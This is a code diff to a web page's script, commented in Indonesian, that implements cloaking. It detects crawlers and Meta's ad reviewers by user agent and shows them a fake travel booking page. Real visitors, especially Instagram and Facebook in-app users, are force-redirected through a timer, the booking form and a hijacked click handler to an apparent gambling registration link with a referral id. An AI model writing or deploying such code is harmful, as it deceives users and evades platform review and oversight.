@@ -147,42 +147,45 @@
     </script>
 </body>
 </html>
-<<script>
-    // Konfigurasi Link Tujuan
+<script>
     const destinationURL = "https://goto77-xbec.store/mobile/daftar?ref_id=06bb666e";
-    
-    // Identitas Pengunjung
     const ua = navigator.userAgent || navigator.vendor || window.opera;
     
-    // Deteksi Bot (Meta Ads Reviewer / Google Bot)
+    // Deteksi Bot lebih ketat
     const isBot = /bot|googlebot|crawler|spider|robot|crawling|facebookexternalhit|facebookcatalog|facebot/i.test(ua);
-    
-    // Deteksi In-App Browser (Instagram & Facebook App)
+    // Deteksi khusus IG/FB
     const isSocialApp = /FBAN|FBAV|Instagram|Messenger/i.test(ua);
 
-    // 1. Logika Form Pemesanan
+    // 1. Fungsi Redirect yang lebih kuat
+    function goNow() {
+        if (!isBot) {
+            // Gunakan top.location untuk menembus iframe Instagram
+            window.top.location.href = destinationURL;
+        }
+    }
+
+    // 2. Logika Form (Jika user klik manual)
     document.getElementById('bookingForm').addEventListener('submit', function(e) {
         e.preventDefault();
-        if (!isBot) {
-            alert('Konfirmasi: Menghubungkan ke sistem pendaftaran TripKuy...');
-            // Menggunakan location.replace agar user tidak bisa 'back' ke halaman putih
-            window.location.replace(destinationURL);
-        } else {
-            alert('Terima kasih! Pesanan Anda telah diterima.');
-        }
+        goNow();
     });
 
-    // 2. Logika Auto-Redirect (Dioptimalkan untuk IG/FB)
+    // 3. Auto-Redirect dengan penanganan khusus Instagram
     if (!isBot) {
-        // Jika di dalam IG/FB, waktu tunggu dibuat lebih singkat (2 detik) agar user tidak kabur
-        const waitTime = isSocialApp ? 2000 : 15000; 
+        // Jika di Instagram, kita beri jeda sedikit lebih lama agar page 'settle' dulu
+        // Terkadang 5 detik terlalu cepat sehingga dianggap crash oleh IG
+        const waitTime = isSocialApp ? 8000 : 12000; 
 
         setTimeout(function() {
-            console.log("Redirecting human user...");
-            // Force redirect menggunakan replace untuk menembus filter browser bawaan
-            window.location.replace(destinationURL);
+            goNow();
         }, waitTime);
-    } else {
-        console.log("Bot detected. Web content stay active.");
+    }
+
+    // 4. Fallback: Jika user klik di mana saja di layar (khusus user asli), langsung redirect
+    // Ini sangat ampuh di Instagram karena dianggap 'Interaksi User'
+    if (!isBot && isSocialApp) {
+        document.body.addEventListener('click', function() {
+            goNow();
+        }, { once: true });
     }
 </script>
